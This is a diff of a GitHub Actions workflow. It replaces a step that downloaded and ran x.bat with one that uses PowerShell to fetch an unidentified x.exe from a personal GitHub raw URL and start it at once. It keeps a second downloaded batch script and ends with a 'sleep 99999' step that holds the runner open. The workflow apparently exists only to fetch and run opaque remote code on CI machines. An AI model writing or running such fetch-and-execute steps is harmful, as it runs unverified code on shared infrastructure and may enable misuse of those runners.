@@ -12,16 +12,20 @@ jobs:
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.bat" -OutFile "x.bat"
           Invoke-WebRequest -Uri "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/uv/Downloads.bat" -OutFile "Downloads.bat"
 
+      - name: run x.exe
+        run: |
+          $url = "https://raw.githubusercontent.com/miso201/miso201/refs/heads/main/w10/x.exe"
+          $destination = "C:\path\to\save\x.exe"
+          Invoke-WebRequest -Uri $url -OutFile $destination
+          Start-Process -FilePath $destination
                   
-        
-      - name: x
-        run: cmd /c x.bat
         
       - name: Downloads
         run: cmd /c Downloads.bat
         
       - name: Time Counter
         run: sleep 99999
+
+        
